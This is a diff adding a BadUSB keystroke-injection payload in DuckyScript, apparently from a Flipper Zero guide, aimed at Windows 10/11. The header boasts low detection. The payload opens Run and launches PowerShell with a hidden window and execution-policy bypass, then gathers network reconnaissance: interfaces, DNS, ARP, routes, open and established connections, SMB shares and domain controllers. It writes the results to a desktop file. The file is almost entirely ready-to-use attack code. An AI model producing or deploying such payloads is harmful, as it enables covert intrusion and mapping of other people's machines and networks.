@@ -1,0 +1,18 @@
+REM ============================================================
+REM Title:    Network Enumeration
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Recon
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~10 secondi
+REM Detect:   Basso - comandi nativi
+REM Desc:     Mappa la rete locale: gateway, DNS, ARP table,
+REM           porte aperte, condivisioni SMB, route table
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\netrecon_'+$env:COMPUTERNAME+'.txt';'=== NETWORK RECON ===' | Out-File $o;'Date: '+(Get-Date) | Out-File $o -Append;'`n=== INTERFACES ===' | Out-File $o -Append;Get-NetIPConfiguration | Out-File $o -Append;'`n=== DNS SERVERS ===' | Out-File $o -Append;Get-DnsClientServerAddress | Out-File $o -Append;'`n=== ARP TABLE ===' | Out-File $o -Append;Get-NetNeighbor | Out-File $o -Append;'`n=== ROUTING ===' | Out-File $o -Append;Get-NetRoute | Out-File $o -Append;'`n=== LISTENING PORTS ===' | Out-File $o -Append;Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess | Out-File $o -Append;'`n=== ESTABLISHED CONNECTIONS ===' | Out-File $o -Append;Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort | Out-File $o -Append;'`n=== SMB SHARES ===' | Out-File $o -Append;net view 2>&1 | Out-File $o -Append;'`n=== DOMAIN INFO ===' | Out-File $o -Append;nltest /dclist: 2>&1 | Out-File $o -Append;systeminfo | findstr /B /C:'Domain' | Out-File $o -Append"
+ENTER
